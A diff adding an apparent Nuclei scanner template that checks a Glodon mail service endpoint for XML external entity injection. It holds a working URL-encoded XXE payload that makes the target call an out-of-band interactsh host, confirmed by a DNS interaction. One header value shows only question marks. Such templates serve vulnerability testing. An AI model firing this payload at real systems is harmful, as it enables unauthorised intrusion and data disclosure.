@@ -1,0 +1,26 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /Mail/Services/EmailAccountOrgUserService.asmx/GetUserCodesByOrgCodes HTTP/1.1
+        Host: {{Hostname}}
+        glodon_sec_info: ?????????????????????????????????????????
+        User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; SM-P585Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        xmlOrgCodes=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22+%3F%3E%3C%21DOCTYPE+root%5B%3C%21ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2F{{interactsh-url}}%22%3E%25remote%3B%5D%3E%3Croot%2F%3E
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
